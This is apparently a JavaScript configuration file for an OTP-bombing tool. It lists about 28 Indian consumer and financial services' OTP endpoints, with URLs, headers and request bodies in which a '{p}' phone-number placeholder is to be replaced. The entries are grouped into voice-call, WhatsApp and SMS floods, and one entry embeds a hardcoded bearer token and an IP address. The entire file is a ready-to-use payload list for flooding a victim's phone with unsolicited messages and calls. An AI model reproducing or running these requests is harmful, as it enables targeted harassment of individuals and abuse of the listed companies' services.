// {n:"name", u:"url", m:"METHOD", h:{headers}, b:"body", c:"category"}
// {p} = phone number replace hoga

module.exports = [
  // ═══════════════════════════════════════════════════════════
  // CALL
  // ═══════════════════════════════════════════════════════════
  {n:"TataCapital_Call",u:"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}","isOtpViaCallAtLogin":"true"}',c:"call"},
  {n:"Swiggy_Call",u:"https://profile.swiggy.com/api/v3/app/request_call_verification",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}"}',c:"call"},
  {n:"Myntra_Call",u:"https://www.myntra.com/gw/mobile-auth/otp/generate",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}"}',c:"call"},
  {n:"Flipkart_Call",u:"https://2.rome.api.flipkart.com/api/4/user/otp/generate",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobileNumber":"{p}"}',c:"call"},
  {n:"Paytm_Call",u:"https://accounts.paytm.com/signin/otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}',c:"call"},
  {n:"Zomato_Call",u:"https://www.zomato.com/php/asyncLogin.php",m:"POST",h:{"Content-Type":"application/x-www-form-urlencoded"},b:"phone={p}",c:"call"},
  {n:"Uber_Call",u:"https://auth.uber.com/v2/otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}"}',c:"call"},
  {n:"PhonePe_Call",u:"https://www.phonepe.com/api/v2/otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}"}',c:"call"},
  {n:"Jio_Call",u:"https://www.jio.com/api/jio-login-service/login/sendOtp",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobileNumber":"{p}","loginFlowType":"MOBILE","alternateNumber":""}',c:"call"},
  {n:"Astroyogi_Call",u:"https://comm.astroyogi.com/api/OtpComm/SendOtp",m:"POST",h:{"Content-Type":"application/json","Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},b:'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{p}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}',c:"call"},
  {n:"Refyne_Call",u:"https://prod-api.refyne.co.in/auth/v3/send-otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"channel":"IVR","recipient":"{p}"}',c:"call"},
  {n:"SonyLiv_Call",u:"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",m:"POST",h:{"Content-Type":"application/json","app_version":"3.8.3"},b:'{"mobileNumber":"{p}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{ts}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}',c:"call"},

  // ═══════════════════════════════════════════════════════════
  // WHATSAPP
  // ═══════════════════════════════════════════════════════════
  {n:"KPN_WA",u:"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone_number":{"number":"{p}","country_code":"+91"}}',c:"whatsapp"},
  {n:"MamaEarth_WA",u:"https://auth.mamaearth.in/v1/auth/initiate-signup",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}"}',c:"whatsapp"},
  {n:"HeroFinCorp_WA",u:"https://loans.apps.herofincorp.com/api/generateOtp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}","terms":true,"whatsapp":true}',c:"whatsapp"},
  {n:"Refyne_WA",u:"https://prod-api.refyne.co.in/auth/v3/send-otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"channel":"WHATSAPP","recipient":"{p}"}',c:"whatsapp"},

  // ═══════════════════════════════════════════════════════════
  // SMS
  // ═══════════════════════════════════════════════════════════
  {n:"Lenskart",u:"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phoneCode":"+91","telephone":"{p}"}',c:"sms"},
  {n:"PharmEasy",u:"https://pharmeasy.in/api/v2/auth/send-otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}"}',c:"sms"},
  {n:"Wakefit",u:"https://api.wakefit.co/api/consumer-sms-otp/",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}"}',c:"sms"},
  {n:"ShipRocket",u:"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobileNumber":"{p}"}',c:"sms"},
  {n:"Zepto",u:"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobileNumber":"{p}"}',c:"sms"},
  {n:"BajajFinserv",u:"https://apigateway.bajajfinserv.in/apigateway/otp/sso",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobileNumber":"{p}","source":"WEB"}',c:"sms"},
  {n:"Licious",u:"https://www.licious.com/auth/api/v1/sendOtp",m:"POST",h:{"Content-Type":"application/json"},b:'{"mobile":"{p}","countryCode":"+91"}',c:"sms"},
  {n:"Dominos",u:"https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}","source":"WEB"}',c:"sms"},
  {n:"Groww",u:"https://groww.in/api/v2/auth/otp/send",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}","platform":"WEB"}',c:"sms"},
  {n:"Meesho",u:"https://api.meesho.com/v2/auth/send_otp",m:"POST",h:{"Content-Type":"application/json"},b:'{"phone":"{p}"}',c:"sms"},
];
